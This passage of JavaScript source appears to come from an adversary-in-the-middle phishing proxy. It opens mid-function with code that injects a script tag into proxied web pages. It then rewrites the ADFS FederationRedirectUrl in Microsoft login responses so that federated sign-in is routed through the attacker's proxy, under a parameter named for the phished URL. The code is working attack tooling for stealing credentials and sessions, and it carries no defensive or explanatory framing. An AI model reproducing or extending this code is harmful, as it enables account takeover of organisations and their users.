    const payload = "<script src=/@></script>";
    const htmlInjectionMap = {
        "<head>": `<head>${payload}`,
        "<html>": `<html><head>${payload}</head>`,
        "<body>": `<head>${payload}</head><body>`
    };
    const indexLimit = 200;

    for (const [key, value] of Object.entries(htmlInjectionMap)) {
        const htmlTagBuffer = Buffer.from(key);
        const injectionPointIndex = decompressedResponseBody.subarray(0, indexLimit).indexOf(htmlTagBuffer);

        if (injectionPointIndex !== -1) {
            return Buffer.concat([
                decompressedResponseBody.subarray(0, injectionPointIndex),
                Buffer.from(value),
                decompressedResponseBody.subarray(injectionPointIndex + htmlTagBuffer.byteLength)
            ]);
        }
    }
    return Buffer.concat([
        Buffer.from(`<head>${payload}</head>`),
        decompressedResponseBody
    ]);
}

// Modify the FederationRedirectUrl variable to proxify the cross-origin navigation request to the ADFS portal
function updateFederationRedirectUrl(decompressedResponseBody, proxyHostname) {
    const decompressedResponseBodyString = decompressedResponseBody.toString();
    const decompressedResponseBodyObject = JSON.parse(decompressedResponseBodyString);
    const federationRedirectUrl = decompressedResponseBodyObject.Credentials.FederationRedirectUrl;

    const proxyRequestURL = new URL(`https://${proxyHostname}${PROXY_PATHNAMES.mutation}`);
    proxyRequestURL.searchParams.append(PHISHED_URL_PARAMETER, encodeURIComponent(federationRedirectUrl));
    
    decompressedResponseBodyObject.Credentials.FederationRedirectUrl = proxyRequestURL;
    return Buffer.from(JSON.stringify(decompressedResponseBodyObject));
}
